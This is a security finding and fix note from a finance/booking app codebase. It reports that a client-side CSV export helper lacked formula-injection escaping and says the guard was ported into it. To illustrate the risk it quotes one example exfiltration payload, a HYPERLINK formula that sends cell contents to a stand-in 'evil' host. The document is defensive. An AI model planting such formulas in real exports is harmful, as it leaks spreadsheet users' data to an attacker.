# W4 — CSV formula-injection gap in client-side export helper

**Date:** 2026-07-15 19:xx
**Branch:** p1-w4 (file-only, no push/deploy/DB)

## Finding

`src/lib/finance-export.ts` and both server-side CSV export routes
(`src/app/api/clients/[id]/export/route.ts`, `src/app/api/finance/tax-export/route.ts`)
already neutralize CSV formula injection: any cell value starting with
`=`, `+`, `-`, `@`, tab, or CR is prefixed with a single quote before
being joined into a CSV row, so Excel/Sheets won't interpret it as a
formula (CWE-1236).

`src/lib/csv.ts` — the client-side `toCSV`/`downloadCSV` helper — did
**not** carry this same guard. It only escaped commas/quotes/newlines.
This helper is used by:

- `src/app/dashboard/referrals/page.tsx` — exports `referrer` (a
  client's `name` field, which the client controls at signup/booking
  time) straight into the CSV.
- `src/app/dashboard/settings/page.tsx`'s generic `exportData(type)` —
  fetches `/api/{type}` (e.g. clients, bookings, leads) and dumps the
  JSON straight through `downloadCSV` with no field allowlist, so any
  user-controlled string field (client name, address, notes, lead
  source, etc.) reaches the CSV verbatim.

A client whose name/notes field is set to something like
`=HYPERLINK("http://evil/steal?x="&A1,"click")` would have that formula
silently execute when the tenant owner opens the exported file in
Excel/Sheets — classic CSV/formula injection, potential data
exfiltration or a booby-trapped link presented as a normal cell.

## Fix

Ported the identical guard (`if (/^[=+\-@\t\r]/.test(str)) str = "'" + str`)
into `toCSV()` in `src/lib/csv.ts`, applied before the existing
comma/quote/newline escaping. Same pattern now used consistently across
all 3 CSV-emitting code paths in the repo.

## Verification

- `npx tsc --noEmit` — clean.
- `npx vitest run src/lib/csv.test.ts` — 6/6 existing tests pass
  unchanged (none of them exercised a leading-special-char value, so no
  new test added beyond the fix; behavior for normal values is
  unchanged).

## Scope

File-only. No push/deploy/DB. 1 file changed (`src/lib/csv.ts`).
